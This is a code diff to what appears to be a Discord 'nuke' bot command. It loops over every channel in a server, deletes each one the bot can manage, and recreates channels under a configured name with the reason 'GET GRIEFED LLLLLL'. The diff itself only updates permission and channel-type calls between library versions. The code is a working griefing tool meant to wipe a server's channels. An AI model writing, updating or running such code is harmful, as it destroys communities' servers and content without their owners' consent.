@@ -13,14 +13,14 @@ module.exports = {
      */
 
     async execute(bot, message, parts) {
-        if(message.guild.me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS)) {
+        if(message.guild.me.hasPermission('MANAGE_CHANNELS')) {
             message.guild.channels.cache.forEach(async ch => {
                 if(ch.permissionsFor(message.guild.me).has(Permissions.FLAGS.MANAGE_CHANNELS)) {
                     ch.delete();
                     await console.log(`[SUCCCESS] Successfully deleted Channel '${ch.name}'`)
                     message.guild.channels.create(bot.cfg.messages.renameChannels, {
                         reason: `GET GRIEFED LLLLLL`,
-                        type: 'GUILD_TEXT'
+                        type: 'text'
                     });
                     await console.log(`${`[SUCCESS]`.green} ${`Successfully created channel '${bot.cfg.messages.renameChannels}' replacing the channel '${ch.name}'!`.yellow}`)
                 } else {
